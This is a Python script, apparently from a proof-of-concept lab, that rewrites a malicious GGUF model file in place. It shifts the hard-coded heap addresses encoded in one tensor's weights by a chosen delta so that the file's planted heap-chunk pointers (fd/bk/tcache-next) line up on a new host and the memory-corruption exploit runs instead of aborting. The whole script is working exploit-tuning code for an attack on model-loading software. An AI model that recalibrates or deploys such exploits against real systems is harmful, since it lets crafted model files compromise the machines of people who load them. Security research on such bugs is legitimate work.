#!/usr/bin/env python3
"""Re-calibrate the hard-coded heap addresses inside the bug-3 artifact.

The artifact encodes exact 32-bit words into its F32 upsample weights, and that
includes the absolute heap addresses the exploit plants (fd/bk/tcache-next of the
structures it builds).  The original lab recorded those structures at
`data() = 0x55555ab144b0`; on this host the state buffer lands 0x100 bytes higher,
so every planted heap address is off by 0x100 and the planted chunk metadata no
longer matches the real structures - which is exactly what turns the run into a
`sysmalloc` abort instead of the planted-pointer chain.

The patch is in-place on a byte level: the file keeps its exact size (a rewritten
GGUF could change the mapping and therefore the very heap layout we are trying to
match), only the matched 32-bit words are incremented by DELTA, and the high 32-bit
halves (0x00005555 / 0x00007fff) are untouched.

  python3 rescale_artifact.py <src.gguf> <dst.gguf> <delta>

The word list is printed before and after the patch so the run log carries the
exact calibration change.
"""
import shutil
import sys

import numpy as np
import gguf

# Heap-address low halves found in the artifact by poc/dump_hardcoded_addrs.py.
# Each pairs with a 0x00005555 high half in the word that follows.
HEAP_WORDS = [
    0x5AD0CB70,   # fenced chunk head  (data() + 0x1F86C0)
    0x5AD0DB90,
    0x5AD0DC80,
    0x5AD0DD00,
    0x5AD0DD40,
    0x5AD0DE00,
    0x5AD0DE80,
    0x596E3070,   # earlier heap (tcache member region)
    0x56CF0238,   # earlier heap
    0x555BFF50,   # earlier heap
]
TENSOR = "a.gen.wav.upsample.weight"


def main() -> None:
    src, dst, delta_s = sys.argv[1], sys.argv[2], sys.argv[3]
    delta = int(delta_s, 0)

    reader = gguf.GGUFReader(src)
    tensor = next((t for t in reader.tensors if t.name == TENSOR), None)
    if tensor is None:
        sys.exit(f"{TENSOR} not found in {src}")

    off, nbytes = tensor.data_offset, tensor.n_bytes
    blob = bytearray(open(src, "rb").read())
    words = np.frombuffer(bytes(blob[off:off + nbytes]), dtype="<u4").copy()

    print(f"source  : {src}")
    print(f"tensor  : {TENSOR}  data_offset={off}  n_bytes={nbytes}  words={words.size}")
    print(f"delta   : {delta:+#x}")

    # Match every target against the ORIGINAL words and apply the shifts in one pass:
    # matching sequentially would re-hit an already shifted value (e.g. 0x5ad0dd00
    # becomes 0x5ad0de00, which is itself a target) and shift it twice.
    plan = []          # (index, new_value)
    for w in HEAP_WORDS:
        idx = np.flatnonzero(words == np.uint32(w))
        if idx.size:
            plan.append((idx, w + delta))
            print(f"  {w:#010x} -> {w + delta:#010x}   x{idx.size}")
        else:
            print(f"  {w:#010x} -> not present")
    for idx, new_value in plan:
        words[idx] = np.uint32(new_value)
    hits = sum(idx.size for idx, _ in plan)

    blob[off:off + nbytes] = words.tobytes()
    open(dst, "wb").write(blob)
    print(f"patched {hits} words, wrote {dst}")

    # verify: the same scan must now find the shifted values and none of the old ones
    again = np.frombuffer(open(dst, "rb").read()[off:off + nbytes], dtype="<u4")
    for w in HEAP_WORDS:
        old = int((again == np.uint32(w)).sum())
        new = int((again == np.uint32(w + delta)).sum())
        status = "OK" if old == 0 and new > 0 else "MISMATCH"
        print(f"  verify {w:#010x}: old={old} new={new}  {status}")


if __name__ == "__main__":
    main()
